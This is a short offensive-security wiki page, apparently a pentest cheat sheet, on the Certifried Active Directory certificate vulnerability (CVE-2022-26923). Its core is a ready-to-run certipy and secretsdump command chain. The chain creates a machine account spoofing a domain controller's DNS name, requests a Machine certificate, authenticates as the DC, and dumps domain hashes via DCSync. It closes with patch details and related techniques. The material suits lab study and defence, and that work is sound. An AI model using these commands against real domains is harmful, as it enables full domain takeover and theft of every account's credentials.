# Certifried (CVE-2022-26923) - Machine Account Certificate Abuse


## The Idea

Prior to the May 2022 patch, a certificate's authentication identity was resolved by matching the SAN's `dNSHostName` to an AD object. Any authenticated user can:

1. Create a computer account (default `MachineAccountQuota = 10`), or take over one they own
2. Set that computer's `dNSHostName` to match a Domain Controller's DNS name
3. Request a machine certificate from the default `Machine` template
4. Authenticate -> the KDC resolves the SAN to the DC's machine account -> cert grants DC identity -> DCSync

## The Attack

```sh
# 1. Create a machine account
certipy account create -u user@corp.local -p pass -dc-ip <DC-IP> \
  -user pwn$ -pass 'Password123!' -dns dc01.corp.local

# 2. Request a cert from the Machine template
certipy req -u 'pwn$@corp.local' -p 'Password123!' -dc-ip <DC-IP> \
  -ca CORP-CA -template Machine

# 3. Authenticate as DC01$ -> machine hash -> DCSync
certipy auth -pfx dc01.pfx -dc-ip <DC-IP>

secretsdump.py -hashes :<DC01$-NT-hash> 'corp.local/DC01$@dc01.corp.local'
```

---

## Patched By

KB5014754 (May 2022) - the `szOID_NTDS_CA_SECURITY_EXT` SID extension pins the cert to the *requester's* SID, so renaming to a DC no longer changes who the KDC authenticates. Still lands on unpatched DCs in labs and neglected environments.

## Related

- [Shadow Credentials](../shadow-credentials.md) - same primitive family (computer object -> cert -> machine identity), works post-patch
- [ESC6](esc6.md) - also relies on SAN-based identity resolution; also broken by the SID extension
